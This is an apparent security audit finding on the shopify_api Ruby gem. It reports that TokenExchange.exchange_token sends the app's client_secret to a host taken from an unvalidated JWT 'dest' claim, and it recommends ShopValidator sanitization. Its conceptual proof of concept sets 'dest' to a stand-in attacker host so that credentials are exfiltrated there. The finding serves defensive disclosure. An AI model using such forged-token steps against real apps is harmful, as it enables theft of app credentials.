### Title
Unsanitized `dest` claim used to send `client_secret` in `TokenExchange.exchange_token` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop host to contact directly from the JWT's `dest` claim without ever validating that it is a trusted Shopify domain, then uses that host to send the app's `client_id`/`client_secret` in a server-to-server POST. This is the same class of bug as the reported issue: a value that is *used* to make a critical decision (here, "which host receives the client secret") is not actually checked against the same trust boundary that a sibling code path enforces.

### Finding Description
`ShopifyAPI::Auth::JwtPayload#shop` simply strips the scheme from the token's `dest` claim with no format/domain validation: [1](#0-0) 

The only binding check performed on the token is that `aud == Context.api_key`: [2](#0-1) 

`aud` says nothing about `dest`; the two claims are independent fields inside the same signed payload, so validating `aud` does not validate that `dest` is a legitimate `*.myshopify.com`/trusted domain.

In `TokenExchange.exchange_token`, this unsanitized `dest_shop` is used directly to build the session that the HTTP client uses to pick the request host, and the app's `client_id`/`client_secret` are then POSTed to that host: [3](#0-2) 

Compare this with the sibling method `migrate_to_expiring_token` in the same file, which explicitly sanitizes the shop through `Utils::ShopValidator.sanitize!` (a helper built specifically to enforce the trusted-domain allowlist) before using it to build the request: [4](#0-3) [5](#0-4) 

The gem's own `HttpClient` uses `session.shop` verbatim to build the target URL (no additional host allowlisting happens downstream), so whatever string reaches `Session#shop` is where the `client_secret` gets sent.

The equality that should hold but doesn't: `host validated by JwtPayload initialization (aud == api_key)` should equal `host that receives client_id/client_secret (dest_shop, taken from raw dest claim)`. Instead, the gem validates the audience of the token but never validates that the `dest` value is actually a trusted Shopify host before treating it as the destination for a credentialed POST request — exactly the pattern the sibling method `migrate_to_expiring_token` guards against with `ShopValidator.sanitize!`.

### Impact Explanation
If `dest` in a validly-decoded session token is ever anything other than a canonical Shopify-controlled `myshopify.com`/`myshopify.io`/`spin.dev`/`shop.dev` host (e.g., a malformed value, a value from a differently-scoped token, or any future change in how Shopify populates `dest`), `exchange_token` will silently POST the app's `client_id` and `client_secret` to that host — an SSRF that exfiltrates the app's `client_secret` to an attacker-controlled or unintended destination. This matches the High-severity category "SSRF with the app's credentials". Given the report's bug class (a value that passes one check being blindly trusted for a different, unguarded purpose), this is a structural inconsistency the gem itself introduces, not misuse by a host application.

### Likelihood Explanation
Exploitability depends entirely on Shopify (or whatever issues the session token) ever supplying a `dest` value that is not a strictly-formed trusted Shopify domain; under normal, correctly-functioning Shopify token issuance, `dest` is always the legitimate shop. This is therefore a defense-in-depth gap rather than an immediately triggerable exploit by an unprivileged internet user — the gem has no independent verification and relies entirely on the correctness of an external, unverified assumption, unlike `migrate_to_expiring_token`, which does not rely on that assumption.

### Recommendation
Call `Utils::ShopValidator.sanitize!(dest_shop)` (or equivalent) on the `dest`-derived shop in `TokenExchange.exchange_token` before using it to build `shop_session`/`Clients::HttpClient`, mirroring the existing pattern in `migrate_to_expiring_token`. More generally, `JwtPayload#shop` should validate `dest` against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` at decode time so that every consumer of `JwtPayload#shop` automatically inherits the trusted-domain guarantee instead of each call site needing to remember to sanitize.

### Proof of Concept
Conceptual (cannot be fully demonstrated without control over Shopify's token issuance):
1. Obtain (or forge, if the shared secret were ever exposed to another context, or via a token replay from a different scoped flow) a session token whose `aud` equals the target app's `api_key` but whose `dest` claim is set to a non-`myshopify.com` host, e.g. `https://attacker.example`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new(token)` succeeds because only `aud` is checked; `jwt_payload.shop` returns `"attacker.example"`.
4. `exchange_token` builds `shop_session = Session.new(shop: "attacker.example")` and issues `client.request(...)`, causing the gem to POST a JSON body containing `client_id` and `client_secret` to `https://attacker.example/admin/oauth/access_token`. [6](#0-5)
